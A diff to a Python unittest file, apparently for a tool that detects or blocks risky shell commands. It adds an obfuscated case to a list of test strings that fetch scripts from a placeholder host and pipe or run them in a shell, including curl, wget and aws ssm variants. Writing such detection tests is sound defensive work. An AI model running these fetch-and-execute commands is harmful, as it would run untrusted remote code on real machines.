@@ -104,7 +104,8 @@ class FalseStops(unittest.TestCase):
             f"if curl -s https://x.example/i.{SH} {PIPE_SH}; then echo ok; fi",
             "cd /tmp && curl -so a.py https://x.example/a.py; python3 a.py",
             f"true && wget -qO- https://x.example/i.{SH} {PIPE_SH}",
-            f"aws ssm send-command --parameters commands='curl -s https://x.example/i.{SH}|{SH}'")
+            f"aws ssm send-command --parameters commands='curl -s https://x.example/i.{SH}|{SH}'",
+            f"f(){{ {SH} i.{SH}; }}; X=curl; $X -s -o i.{SH} https://x.example/i.{SH}; f")
 
     def test_help_of_a_held_command_runs_nothing(self):
         # --help right after the command's own words prints help and exits
